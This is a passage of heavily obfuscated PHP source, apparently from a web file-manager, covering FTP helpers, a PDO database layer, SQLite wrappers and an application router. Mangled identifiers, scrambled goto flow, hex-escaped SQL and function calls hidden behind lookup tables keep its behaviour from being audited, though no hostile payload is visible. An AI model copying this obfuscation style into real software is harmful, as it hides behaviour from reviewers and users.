(!IO::mkdir($BÆ¹àÅÇÒì)) { return !1; } goto f…ÑìÃêÛç; FÎ’ƒÂÜÓÇ: while ($EÛ»œ¸ï® == FTP_MOREDATA) { $EÛ»œ¸ï® = ftp_nb_continue($this->connect); } if ($EÛ»œ¸ï® != FTP_FINISHED) { return !1; } return $this->iconvApp($cô´ôÍ¹¥‹); goto a»Æ´šÈªô; a»Æ´šÈªô: } public function exist($DÅ£‡—†Š™) { return $this->isFile($DÅ£‡—†Š™) || $this->isFolder($DÅ£‡—†Š™); } public function isFile($cäš’¯ÄÍÛ) { return !$this->isFolder($cäš’¯ÄÍÛ) && $this->objectMeta($cäš’¯ÄÍÛ); } public function isFolder($bÙ‰ŸÁÅÀ) { return $this->cacheMethod($_SERVER[ÒÆ›ÆØÎ¾][199], $bÙ‰ŸÁÅÀ); } protected function objectMeta($d»Á÷ªß) { return $this->cacheMethod($_SERVER[ÒÆ›ÆØÎ¾][200], $d»Á÷ªß); } protected function _objectMeta($DÈØª©³ĞŒ) { goto F‡Ö«ìÉ‚Ï; BÈŞáù«£¤: $cø«ãÕ·Ş´ = @ftp_size($this->connect, $DÈØª©³ĞŒ); if ($cø«ãÕ·Ş´ != -1) { $D‰Ê°¡ç‹Ä[$F’«èÈ—İ¦[78]] = $cø«ãÕ·Ş´; } else { $CäŸ›ß‡¸‘ = @ftp_chdir($this->connect, $DÈØª©³ĞŒ); if (!$CäŸ›ß‡¸‘) { return !1; } $D‰Ê°¡ç‹Ä[$F’«èÈ—İ¦[29]] = $F’«èÈ—İ¦[77]; } return $D‰Ê°¡ç‹Ä; goto eáÍ…íà; dößî…å£÷: $DÈØª©³ĞŒ = $this->iconvSystem($DÈØª©³ĞŒ); $D‰Ê°¡ç‹Ä = array($F’«èÈ—İ¦[28] => $this->iconvApp($DÈØª©³ĞŒ), $F’«èÈ—İ¦[29] => $F’«èÈ—İ¦[193], $F’«èÈ—İ¦[78] => 0); @ftp_chdir($this->connect, $F’«èÈ—İ¦[8]); goto BÈŞáù«£¤; F‡Ö«ìÉ‚Ï: $F’«èÈ—İ¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($DÈØª©³ĞŒ == $F’«èÈ—İ¦[33] || $DÈØª©³ĞŒ == $F’«èÈ—İ¦[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto dößî…å£÷; eáÍ…íà: } protected function _isFolder($Eããìœ‚ñ) { $f­ŒæÄñµÍ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($Eããìœ‚ñ == $f­ŒæÄñµÍ[33] || $Eããìœ‚ñ == $f­ŒæÄñµÍ[8]) { return !0; } $c‹Æ‰‚¥àÑ = $this->_objectMeta($Eããìœ‚ñ); return isset($c‹Æ‰‚¥àÑ[$f­ŒæÄñµÍ[29]]) && $c‹Æ‰‚¥àÑ[$f­ŒæÄñµÍ[29]] == $f­ŒæÄñµÍ[77] ? !0 : !1; } } goto b¢é‹¬ŠÙø; BğÉô˜ãÈ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($bæÄ—“áÓ· = '') { $f¹æ‰è‚Åâ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!class_exists($f¹æ‰è‚Åâ[864])) { think_exception(think_lang($f¹æ‰è‚Åâ[10]) . $f¹æ‰è‚Åâ[865]); } if (!empty($bæÄ—“áÓ·)) { $this->config = $bæÄ—“áÓ·; if (empty($this->config[$f¹æ‰è‚Åâ[13]])) { $this->config[$f¹æ‰è‚Åâ[13]] = array(); } } } public function connect($A‹³³ŞÖÙ = '', $C’öµ¢ÊÎƒ = 0) { $AªÇïá =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!isset($this->linkID[$C’öµ¢ÊÎƒ])) { goto eÆ•ìàÏÖñ; eÆ•ìàÏÖñ: if (empty($A‹³³ŞÖÙ)) { $A‹³³ŞÖÙ = $this->config; } $Aø¡Ô…Àà = !empty($A‹³³ŞÖÙ[$AªÇïá[13]][$AªÇïá[14]]) ? $A‹³³ŞÖÙ[$AªÇïá[13]][$AªÇïá[14]] : $this->pconnect; if ($Aø¡Ô…Àà) { $A‹³³ŞÖÙ[$AªÇïá[13]][PDO::ATTR_PERSISTENT] = !0; } goto f†ÇÃî½×; b¶•½ ¨ò: if (1 != think_config($AªÇïá[18])) { unset($this->config); } goto aÄÖƒç ´ä; DÆ•ù¤¢: if (!$this->linkID[$C’öµ¢ÊÎƒ]) { think_exception($AªÇïá[874]); } try { $this->linkID[$C’öµ¢ÊÎƒ]->exec($AªÇïá[875] . think_config($AªÇïá[842])); } catch (Exception $fŞˆ´ƒÓ„İ) { } $this->connected = !0; goto b¶•½ ¨ò; f†ÇÃî½×: try { $this->linkID[$C’öµ¢ÊÎƒ] = new PDO($A‹³³ŞÖÙ[$AªÇïá[866]], $A‹³³ŞÖÙ[$AªÇïá[839]], $A‹³³ŞÖÙ[$AªÇïá[840]], $A‹³³ŞÖÙ[$AªÇïá[13]]); } catch (PDOException $fŞˆ´ƒÓ„İ) { think_exception($fŞˆ´ƒÓ„İ->getMessage()); } $this->dbType = $this->_getDsnType($A‹³³ŞÖÙ[$AªÇïá[866]]); if (in_array($this->dbType, array($AªÇïá[867], $AªÇïá[868], $AªÇïá[869], $AªÇïá[870]))) { think_exception($AªÇïá[871] . $this->dbType . $AªÇïá[872] . $this->dbType . $AªÇïá[873]); } goto DÆ•ù¤¢; aÄÖƒç ´ä: } return $this->linkID[$C’öµ¢ÊÎƒ]; } public function free() { $this->PDOStatement = null; } public function query($EŸÊ—ÛŒ, $E‹Š…È£‰ƒ = array()) { goto Eå—°‹„»; cˆÍåÉä®í: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $f—Ïº§­÷ = $this->PDOStatement->execute($E‹Š…È£‰ƒ); $this->debug(); goto CªÀÔåàÁ±; eÙ´Ş½‰›œ: think_action_status($Dç¶Š‹ÈÇ[19], 1); think_status($Dç¶Š‹ÈÇ[20]); $this->PDOStatement = $this->_linkID->prepare($EŸÊ—ÛŒ); goto cˆÍåÉä®í; CªÀÔåàÁ±: if (!1 === $f—Ïº§­÷) { $this->error(); return !1; } else { return $this->getAll(); } goto aÚåó¶ğŒÄ; f©¯Ù„ğ™®: $this->queryStr = $EŸÊ—ÛŒ; if (!empty($E‹Š…È£‰ƒ)) { $this->queryStr .= $Dç¶Š‹ÈÇ[876] . print_r($E‹Š…È£‰ƒ, !0) . $Dç¶Š‹ÈÇ[877]; } if (!empty($this->PDOStatement)) { $this->free(); } goto eÙ´Ş½‰›œ; Eå—°‹„»: $Dç¶Š‹ÈÇ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto f©¯Ù„ğ™®; aÚåó¶ğŒÄ: } public function execute($a™¬™é§Ô•, $CŒ…Ê˜ÅÒš = array()) { goto EÓĞ¹“è³Í; bâ¡ˆ‡§: if ($this->dbType == $dÆ†…Úó­[870]) { if (preg_match($dÆ†…Úó­[878], $this->queryStr, $EøÁ”¡Œ½ª)) { $this->table = think_config($dÆ†…Úó­[879]) . str_ireplace(think_config($dÆ†…Úó­[880]), $dÆ†…Úó­[375], $EøÁ”¡Œ½ª[2]); $E²¬“‰¾Ú­ = (bool) $this->query($dÆ†…Úó­[881] . strtoupper($this->table) . $dÆ†…Úó­[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($dÆ†…Úó­[21], 1); goto A×¼ÈÕ†Üº; EÓĞ¹“è³Í: $dÆ†…Úó­ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f÷áØŞë©¢; A×¼ÈÕ†Üº: think_status($dÆ†…Úó­[20]); $this->PDOStatement = $this->_linkID->prepare($a™¬™é§Ô•); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto eÚ«é‡ñÒğ; eÚ«é‡ñÒğ: $FÂŞĞ—£É = $this->PDOStatement->execute($CŒ…Ê˜ÅÒš); $this->debug(); if (!1 === $FÂŞĞ—£É) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($E²¬“‰¾Ú­ || preg_match($dÆ†…Úó­[882], $a™¬™é§Ô•)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto AäƒÛè¸‹±; f÷áØŞë©¢: $this->queryStr = $a™¬™é§Ô•; if (!empty($CŒ…Ê˜ÅÒš)) { $this->queryStr .= $dÆ†…Úó­[876] . print_r($CŒ…Ê˜ÅÒš, !0) . $dÆ†…Úó­[877]; } $E²¬“‰¾Ú­ = !1; goto bâ¡ˆ‡§; AäƒÛè¸‹±: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c®¦£Ö’Êø = $this->_linkID->commit(); $this->transTimes = 0; if (!$c®¦£Ö’Êø) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $BÊŠ¼ËÁõ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$BÊŠ¼ËÁõ) { $this->error(); return !1; } } return !0; } private function getAll() { $b“¨Ïò‡ÅŒ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($b“¨Ïò‡ÅŒ); return $b“¨Ïò‡ÅŒ; } public function getFields($cİ—¹£‘˜¤) { goto cŒ„ç‘ÚÌ; cŒ„ç‘ÚÌ: $eÊŞçõö¸É =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->initConnect(!0); if (think_config($eÊŞçõö¸É[883])) { $d‘òÆ¾Ÿõ³ = str_replace($eÊŞçõö¸É[884], $cİ—¹£‘˜¤, think_config($eÊŞçõö¸É[883])); } else { switch ($this->dbType) { case $eÊŞçõö¸É[867]: case $eÊŞçõö¸É[885]: $d‘òÆ¾Ÿõ³ = "\123\x45\114\x45\103\x54\40\x20\40\143\157\154\x75\x6d\156\137\156\x61\155\x65\40\x61\163\40\47\116\141\155\x65\47\54\x20\x20\40\x64\x61\x74\141\x5f\164\171\x70\145\40\x61\x73\x20\x27\x54\x79\x70\x65\x27\x2c\40\40\40\143\157\154\165\x6d\156\x5f\x64\x65\x66\141\165\154\x74\x20\x61\163\40\47\x44\x65\x66\x61\165\x6c\x74\x27\54\x20\x20\40\151\x73\x5f\x6e\x75\x6c\x6c\141\142\x6c\x65\x20\141\x73\40\x27\116\x75\x6c\154\x27\xa\x9\x9\x46\x52\x4f\x4d\11\151\156\x66\157\162\x6d\x61\164\x69\157\156\x5f\x73\143\x68\145\x6d\x61\56\164\x61\x62\154\x65\x73\x20\x41\x53\40\x74\12\x9\x9\112\117\x49\x4e\x9\x69\x6e\x66\x6f\x72\155\x61\164\x69\x6f\x6e\x5f\x73\143\150\x65\x6d\141\x2e\x63\157\154\x75\x6d\156\163\40\x41\x53\40\x63\12\x9\x9\x4f\x4e\x20\x20\164\56\164\141\142\154\x65\x5f\143\x61\164\x61\x6c\157\147\40\x3d\x20\x63\x2e\164\141\x62\154\145\x5f\x63\141\x74\x61\154\x6f\147\12\11\x9\101\x4e\x44\40\164\56\164\141\142\154\x65\x5f\163\x63\x68\x65\155\x61\40\75\40\143\56\164\x61\142\x6c\145\x5f\x73\x63\x68\x65\x6d\141\12\11\11\x41\116\104\x20\x74\56\164\x61\142\154\145\x5f\x6e\141\x6d\145\40\75\40\x63\x2e\x74\x61\x62\x6c\x65\137\156\x61\155\145\12\x9\x9\x57\x48\105\x52\x45\40\x20\40\x74\x2e\164\x61\x62\154\145\137\156\141\x6d\145\x20\75\40\47{$cİ—¹£‘˜¤}\x27"; break; case $eÊŞçõö¸É[886]: $d‘òÆ¾Ÿõ³ = $eÊŞçõö¸É[887] . $cİ—¹£‘˜¤ . $eÊŞçõö¸É[888]; break; case $eÊŞçõö¸É[868]: case $eÊŞçõö¸É[870]: $d‘òÆ¾Ÿõ³ = $eÊŞçõö¸É[889] . $eÊŞçõö¸É[890] . $eÊŞçõö¸É[891] . strtoupper($cİ—¹£‘˜¤) . $eÊŞçõö¸É[892] . strtoupper($cİ—¹£‘˜¤) . $eÊŞçõö¸É[893]; break; case $eÊŞçõö¸É[894]: $d‘òÆ¾Ÿõ³ = $eÊŞçõö¸É[895] . $cİ—¹£‘˜¤ . $eÊŞçõö¸É[896]; break; case $eÊŞçõö¸É[869]: break; case $eÊŞçõö¸É[897]: default: $d‘òÆ¾Ÿõ³ = $eÊŞçõö¸É[898] . ($this->dbType == $eÊŞçõö¸É[897] ? "\140{$cİ—¹£‘˜¤}\x60" : $cİ—¹£‘˜¤); } } goto c’‰—ËğˆÌ; c¾Ï¤ß§ßˆ: return $dÔíÓîì°¬; goto C¤™³Æê·¢; c’‰—ËğˆÌ: $Fâ¼´…·ÖÂ = $this->query($d‘òÆ¾Ÿõ³); $dÔíÓîì°¬ = array(); if ($Fâ¼´…·ÖÂ) { foreach ($Fâ¼´…·ÖÂ as $Aù´âƒ¥íô => $Fè¦›Ø¹›à) { $Fè¦›Ø¹›à = array_change_key_case($Fè¦›Ø¹›à); $Fè¦›Ø¹›à[$eÊŞçõö¸É[28]] = isset($Fè¦›Ø¹›à[$eÊŞçõö¸É[28]]) ? $Fè¦›Ø¹›à[$eÊŞçõö¸É[28]] : $eÊŞçõö¸É[375]; $Fè¦›Ø¹›à[$eÊŞçõö¸É[29]] = isset($Fè¦›Ø¹›à[$eÊŞçõö¸É[29]]) ? $Fè¦›Ø¹›à[$eÊŞçõö¸É[29]] : $eÊŞçõö¸É[375]; $D‘ØÖ’¯ˆ = isset($Fè¦›Ø¹›à[$eÊŞçõö¸É[271]]) ? $Fè¦›Ø¹›à[$eÊŞçõö¸É[271]] : $Fè¦›Ø¹›à[$eÊŞçõö¸É[28]]; $dÔíÓîì°¬[$D‘ØÖ’¯ˆ] = array($eÊŞçõö¸É[28] => $D‘ØÖ’¯ˆ, $eÊŞçõö¸É[29] => $Fè¦›Ø¹›à[$eÊŞçõö¸É[29]], $eÊŞçõö¸É[31] => (bool) (isset($Fè¦›Ø¹›à[$eÊŞçõö¸É[103]]) && $Fè¦›Ø¹›à[$eÊŞçõö¸É[103]] === $eÊŞçõö¸É[33] || isset($Fè¦›Ø¹›à[$eÊŞçõö¸É[31]]) && $Fè¦›Ø¹›à[$eÊŞçõö¸É[31]] === $eÊŞçõö¸É[33]), $eÊŞçõö¸É[34] => isset($Fè¦›Ø¹›à[$eÊŞçõö¸É[34]]) ? $Fè¦›Ø¹›à[$eÊŞçõö¸É[34]] : (isset($Fè¦›Ø¹›à[$eÊŞçõö¸É[53]]) ? $Fè¦›Ø¹›à[$eÊŞçõö¸É[53]] : $eÊŞçõö¸É[375]), $eÊŞçõö¸É[36] => isset($Fè¦›Ø¹›à[$eÊŞçõö¸É[93]]) ? strtolower($Fè¦›Ø¹›à[$eÊŞçõö¸É[93]]) == $eÊŞçõö¸É[38] : (isset($Fè¦›Ø¹›à[$eÊŞçõö¸É[54]]) ? $Fè¦›Ø¹›à[$eÊŞçõö¸É[54]] : !1), $eÊŞçõö¸É[39] => isset($Fè¦›Ø¹›à[$eÊŞçõö¸É[899]]) ? strtolower($Fè¦›Ø¹›à[$eÊŞçõö¸É[899]]) == $eÊŞçõö¸É[41] : (isset($Fè¦›Ø¹›à[$eÊŞçõö¸É[93]]) ? $Fè¦›Ø¹›à[$eÊŞçõö¸É[93]] : !1)); } } goto c¾Ï¤ß§ßˆ; C¤™³Æê·¢: } public function getTables($b°«£óéÙ = '') { $dâóÎ¥°ãÜ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (think_config($dâóÎ¥°ãÜ[900])) { $E›î³³“Ë = str_replace($dâóÎ¥°ãÜ[901], $b°«£óéÙ, think_config($dâóÎ¥°ãÜ[900])); } else { switch ($this->dbType) { case $dâóÎ¥°ãÜ[868]: case $dâóÎ¥°ãÜ[870]: $E›î³³“Ë = $dâóÎ¥°ãÜ[902]; break; case $dâóÎ¥°ãÜ[867]: case $dâóÎ¥°ãÜ[885]: $E›î³³“Ë = $dâóÎ¥°ãÜ[903]; break; case $dâóÎ¥°ãÜ[894]: $E›î³³“Ë = $dâóÎ¥°ãÜ[904]; break; case $dâóÎ¥°ãÜ[869]: think_exception(think_lang($dâóÎ¥°ãÜ[905]) . $dâóÎ¥°ãÜ[906]); break; case $dâóÎ¥°ãÜ[886]: $E›î³³“Ë = $dâóÎ¥°ãÜ[42] . $dâóÎ¥°ãÜ[43] . $dâóÎ¥°ãÜ[44]; break; case $dâóÎ¥°ãÜ[897]: default: if (!empty($b°«£óéÙ)) { $E›î³³“Ë = $dâóÎ¥°ãÜ[850] . $b°«£óéÙ . $dâóÎ¥°ãÜ[851]; } else { $E›î³³“Ë = $dâóÎ¥°ãÜ[852]; } } } $EÜì×ç¨Öî = $this->query($E›î³³“Ë); $aİ¥†ÁÒìµ = array(); foreach ($EÜì×ç¨Öî as $a—ñçäß® => $FÈËÑ¯™³) { $aİ¥†ÁÒìµ[$a—ñçäß®] = current($FÈËÑ¯™³); } return $aİ¥†ÁÒìµ; } protected function parseLimit($c×¸Ûç‹‚²) { $AÔ¨êŠ…œî =& $_SERVER[ÒÆ›ÆØÎ¾]; $cÓ³³¤„‚ = $AÔ¨êŠ…œî[33]; if (!empty($c×¸Ûç‹‚²)) { switch ($this->dbType) { case $AÔ¨êŠ…œî[894]: case $AÔ¨êŠ…œî[886]: $c×¸Ûç‹‚² = explode($AÔ¨êŠ…œî[47], $c×¸Ûç‹‚²); if (count($c×¸Ûç‹‚²) > 1) { $cÓ³³¤„‚ .= $AÔ¨êŠ…œî[48] . $c×¸Ûç‹‚²[1] . $AÔ¨êŠ…œî[49] . $c×¸Ûç‹‚²[0] . $AÔ¨êŠ…œî[50]; } else { $cÓ³³¤„‚ .= $AÔ¨êŠ…œî[48] . $c×¸Ûç‹‚²[0] . $AÔ¨êŠ…œî[50]; } break; case $AÔ¨êŠ…œî[867]: case $AÔ¨êŠ…œî[885]: break; case $AÔ¨êŠ…œî[869]: break; case $AÔ¨êŠ…œî[868]: case $AÔ¨êŠ…œî[870]: break; case $AÔ¨êŠ…œî[897]: default: $cÓ³³¤„‚ .= $AÔ¨êŠ…œî[48] . $c×¸Ûç‹‚² . $AÔ¨êŠ…œî[50]; } } return $cÓ³³¤„‚; } public function parseKey(&$AÂ¾º¼ÖÄ, $bË·àíĞ…¾ = true) { $C±ÛÄØ÷î® =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($bË·àíĞ…¾) { $AÂ¾º¼ÖÄ = $this->parseKeyCheck($AÂ¾º¼ÖÄ); } if ($this->dbType == $C±ÛÄØ÷î®[897]) { if ($AÂ¾º¼ÖÄ != $C±ÛÄØ÷î®[182] && !preg_match($C±ÛÄØ÷î®[862], $AÂ¾º¼ÖÄ)) { $AÂ¾º¼ÖÄ = $C±ÛÄØ÷î®[382] . trim($AÂ¾º¼ÖÄ, $C±ÛÄØ÷î®[382]) . $C±ÛÄØ÷î®[382]; } return $AÂ¾º¼ÖÄ; } else { return parent::parseKey($AÂ¾º¼ÖÄ, $bË·àíĞ…¾); } } public function close() { $this->_linkID = null; } public function error() { $a¢ÍÍëÊÕÙ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($this->PDOStatement) { $CÉøŒÛ¢Ğ = $this->PDOStatement->errorInfo(); $this->error = $CÉøŒÛ¢Ğ[1] . $a¢ÍÍëÊÕÙ[4] . $CÉøŒÛ¢Ğ[2]; } else { $this->error = $a¢ÍÍëÊÕÙ[33]; } if ($a¢ÍÍëÊÕÙ[33] != $this->queryStr) { $this->error .= LNG($a¢ÍÍëÊÕÙ[45]) . $this->queryStr; } think_trace($this->error, $a¢ÍÍëÊÕÙ[33], $a¢ÍÍëÊÕÙ[46]); return $this->error; } public function escapeString($Eãó‘àñ«é) { $f–õ®œã„ =& $_SERVER[ÒÆ›ÆØÎ¾]; switch ($this->dbType) { case $f–õ®œã„[894]: case $f–õ®œã„[867]: case $f–õ®œã„[885]: case $f–õ®œã„[897]: return addslashes($Eãó‘àñ«é); case $f–õ®œã„[869]: case $f–õ®œã„[886]: case $f–õ®œã„[868]: case $f–õ®œã„[870]: return str_ireplace($f–õ®œã„[55], $f–õ®œã„[56], $Eãó‘àñ«é); } } protected function parseValue($b²‘ñÄØÔš) { $f™ÌÙë×æ½ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (is_string($b²‘ñÄØÔš)) { $cÕ¦ ‹›· = strpos($b²‘ñÄØÔš, $f™ÌÙë×æ½[4]) === 0 && in_array($b²‘ñÄØÔš, array_keys($this->bind)); $b²‘ñÄØÔš = $cÕ¦ ‹›· ? $this->escapeString($b²‘ñÄØÔš) : $f™ÌÙë×æ½[907] . $this->escapeString($b²‘ñÄØÔš) . $f™ÌÙë×æ½[907]; } elseif (isset($b²‘ñÄØÔš[0]) && is_string($b²‘ñÄØÔš[0]) && strtolower($b²‘ñÄØÔš[0]) == $f™ÌÙë×æ½[295]) { $b²‘ñÄØÔš = $this->escapeString($b²‘ñÄØÔš[1]); } elseif (is_array($b²‘ñÄØÔš)) { $b²‘ñÄØÔš = array_map(array($this, $f™ÌÙë×æ½[908]), $b²‘ñÄØÔš); } elseif (is_bool($b²‘ñÄØÔš)) { $b²‘ñÄØÔš = $b²‘ñÄØÔš ? $f™ÌÙë×æ½[87] : $f™ÌÙë×æ½[191]; } elseif (is_null($b²‘ñÄØÔš)) { $b²‘ñÄØÔš = $f™ÌÙë×æ½[103]; } return $b²‘ñÄØÔš; } public function getLastInsertId() { $AÎİÊòÖÑ =& $_SERVER[ÒÆ›ÆØÎ¾]; switch ($this->dbType) { case $AÎİÊòÖÑ[894]: case $AÎİÊòÖÑ[886]: case $AÎİÊòÖÑ[867]: case $AÎİÊòÖÑ[885]: case $AÎİÊòÖÑ[869]: case $AÎİÊòÖÑ[897]: return $this->_linkID->lastInsertId(); case $AÎİÊòÖÑ[868]: case $AÎİÊòÖÑ[870]: $C²Èä¦÷‚ = $this->table; $bğˆ»èÉ = $this->query("\123\x45\114\x45\103\x54\40{$C²Èä¦÷‚}\56\x63\x75\162\162\x76\141\x6c\x20\143\x75\x72\162\166\141\154\x20\x46\x52\117\x4d\x20\x64\x75\x61\154"); return $bğˆ»èÉ ? $bğˆ»èÉ[0][$AÎİÊòÖÑ[909]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($A¦½ëÉßåŸ) { $fÚƒõ±ØŞƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!CacheLock::fileLock($fÚƒõ±ØŞƒ[9])) { return !1; } $eÏŞÏ©ìóé = parent::query($A¦½ëÉßåŸ); CacheLock::fileUnLock($fÚƒõ±ØŞƒ[9]); return $eÏŞÏ©ìóé; } public function execute($fé¤ë‰Š·) { $a‹ğ¢Ãâ¸ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!CacheLock::fileLock($a‹ğ¢Ãâ¸[9])) { return !1; } $dÀÁœùŠÊõ = parent::execute($fé¤ë‰Š·); CacheLock::fileUnLock($a‹ğ¢Ãâ¸[9]); return $dÀÁœùŠÊõ; } } class DbSqlite3 extends DbSqlite3Base { public function query($FéÌŠ¶ç·­) { $b¤‚ËšŒù÷ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!CacheLock::fileLock($b¤‚ËšŒù÷[9])) { return !1; } $F«¡Êˆ££î = parent::query($FéÌŠ¶ç·­); CacheLock::fileUnLock($b¤‚ËšŒù÷[9]); return $F«¡Êˆ££î; } public function execute($C›±Ğ›±…„) { $Bƒ¯ã›ËŞ… =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!CacheLock::fileLock($Bƒ¯ã›ËŞ…[9])) { return !1; } $eˆƒÎ‹½àã = parent::execute($C›±Ğ›±…„); CacheLock::fileUnLock($Bƒ¯ã›ËŞ…[9]); return $eˆƒÎ‹½àã; } } goto D»‘‰ç´ê; C˜Ì„¦ŒÜ: function binCheckBigger($B¡ç„Ç›¹®, $Cíàğ´§âÍ) { return $B¡ç„Ç›¹® > $Cíàğ´§âÍ; } $_SERVER[$_SERVER[©Ç§—][3]] = (strrev('1609').base64_decode('NDA='))+0;$_KXPY="8xzwWpbq4hBnj2Kyv3HrZBE5ryQ2iWIKQ4k5kjXJ6F9CNnYRaISmZXcFfD8fwDvtUX9x3";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($eµÇ–íã·ã, $aÁË¸‚·ˆ) { $CÃØö¿Êˆ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (isset(self::$_methodList[$eµÇ–íã·ã])) { return @call_user_func_array(self::$_methodList[$eµÇ–íã·ã], $aÁË¸‚·ˆ); } else { if (method_exists($this, $eµÇ–íã·ã)) { return call_user_func_array(array($this, $eµÇ–íã·ã), $aÁË¸‚·ˆ); } else { think_exception(__CLASS__ . $CÃØö¿Êˆ[4] . $eµÇ–íã·ã . $CÃØö¿Êˆ[5]); } } } public static function __callStatic($E¡ñã†å¡, $c½ÙµÔµë•) { if (isset(self::$_methodListStatic[$E¡ñã†å¡])) { return call_user_func_array(self::$_methodListStatic[$E¡ñã†å¡], $c½ÙµÔµë•); } else { if (method_exists(self, $E¡ñã†å¡)) { return call_user_func_array(array(self, $E¡ñã†å¡), $c½ÙµÔµë•); } else { show_json("{$E¡ñã†å¡}\x28\x29\x20\156\157\x74\40\145\x78\x69\x73\164\x3b", !1); } } } public static function addMethod($c«â´Ø§ë•, $f«È‚°¸÷°) { self::$_methodList[$c«â´Ø§ë•] = $f«È‚°¸÷°; } public static function addMethodStatic($bŠ¸ ÔœÎ‘, $eÏõ«ÊÒÕò) { self::$_methodListStatic[$bŠ¸ ÔœÎ‘] = $eÏõ«ÊÒÕò; } } goto E½»å¯‡; Dò‡à§“äÀ: $E¶ƒ•¡«µ = $_SERVER[ÒÆ›ÆØÎ¾][578]; while (strlen($E¶ƒ•¡«µ) < $_SERVER[ÒÆ›ÆØÎ¾][579]) { if (!$E¶ƒ•¡«µ) { break; } $E¶ƒ•¡«µ++; } class Application { private $defaultModule = "\151\156\x64\x65\x78"; private $defaultController = "\151\x6e\x64\x65\170"; private $defaultAction = "\151\156\144\x65\x78"; function __construct() { } public function setDefault($D‡Ô‡µ†èÇ) { goto AĞñ™·îÏ; bÛ§‚˜¦•‡: $D¿÷Ä¤·” = $a÷Â‘’’ŒÕ[580]; $this->{$_SERVER[™ñğşİ€©ˆç][3]}($cëšàÉ«È©[4], array($this, $cëšàÉ«È©[5])); $E¿áœšÅšĞ = $a÷Â‘’’ŒÕ[581]; goto Dõ×‘ÎåÑ; CšãˆßæĞá: $this->defaultModule = $aå´¡ÙĞõ[0] ? $aå´¡ÙĞõ[0] : $this->defaultModule; $this->defaultController = $aå´¡ÙĞõ[1] ? $aå´¡ÙĞõ[1] : $this->defaultController; $this->defaultAction = $aå´¡ÙĞõ[2] ? $aå´¡ÙĞõ[2] : $this->defaultAction; goto bÛ§‚˜¦•‡; AĞñ™·îÏ: $a÷Â‘’’ŒÕ =& $_SERVER[ÒÆ›ÆØÎ¾]; $cëšàÉ«È© =& $_SERVER[™ñğşİ€©ˆç]; $aå´¡ÙĞõ = $cëšàÉ«È©[0]($cëšàÉ«È©[1], $cëšàÉ«È©[2]($D‡Ô‡µ†èÇ, $cëšàÉ«È©[1])); goto CšãˆßæĞá; Dõ×‘ÎåÑ: } public function appRun($Aãº‘Ö‰˜ç) { goto E¡ëŠÖ¥; EÇ‡øòÕÉò: $a÷ãµéùî•[17]($Aãº‘Ö‰˜ç); $a÷ãµéùî•[13](array($a÷ãµéùî•[14], $a÷ãµéùî•[15]), $e‘—öá·Ÿ÷ . $a÷ãµéùî•[18], $Aãº‘Ö‰˜ç); goto fššß¾•¨; aœè¯Æ¥: $eøä–ÍÒ½ = $bËª¤Š¬[582]; while ($eøä–ÍÒ½ < $bËª¤Š¬[583]) { if ($eøä–ÍÒ½ >= 0) { break; } $eøä–ÍÒ½++; } $F†¬‡‡Ä = $a÷ãµéùî•[6]($AğÁ¹ïº‰¾[0]); goto c‚Üµ££¬½; c‚Üµ££¬½: $e‘—öá·Ÿ÷ = $a÷ãµéùî•[7]; if ($F†¬‡‡Ä == $a÷ãµéùî•[8]) { $e‘—öá·Ÿ÷ = $a÷ãµéùî•[9]; $AğÁ¹ïº‰¾[0] = $a÷ãµéùî•[10]; $AğÁ¹ïº‰¾[1] = $AğÁ¹ïº‰¾[1] . $a÷ãµéùî•[11]; $Aãº‘Ö‰˜ç = $a÷ãµéùî•[12]($a÷ãµéùî•[1], $AğÁ¹ïº‰¾); $Aãº‘Ö‰˜ç = $a÷ãµéùî•[2]($Aãº‘Ö‰˜ç, $a÷ãµéùî•[1]); } $a÷ãµéùî•[13](array($a÷ãµéùî•[14], $a÷ãµéùî•[15]), $e‘—öá·Ÿ÷ . $a÷ãµéùî•[16], $Aãº‘Ö‰˜ç); goto EÇ‡øòÕÉò; E¡ëŠÖ¥: $bËª¤Š¬ =& $_SERVER[ÒÆ›ÆØÎ¾]; $a÷ãµéùî• =& $_SERVER[™ñğşİ€©ˆç]; $AğÁ¹ïº‰¾ = $a÷ãµéùî•[0]($a÷ãµéùî•[1], $Aãº‘Ö‰˜ç); goto aœè¯Æ¥; fššß¾•¨: } private function autorun() { $cìƒ­‰¸Ë£ =& $_SERVER[™ñğşİ€©ˆç]; global $config; if ($cìƒ­‰¸Ë£[19]($config[$cìƒ­‰¸Ë£[20]]) == 0) { return; } foreach ($config[$cìƒ­‰¸Ë£[20]] as $BŞîµæ¼İÆ => $a²ºö›öàñ) { $this->{$_SERVER[™ñğşİ€©ˆç][21]}($a²ºö›öàñ); $f·‘ùø¡‡Ã = 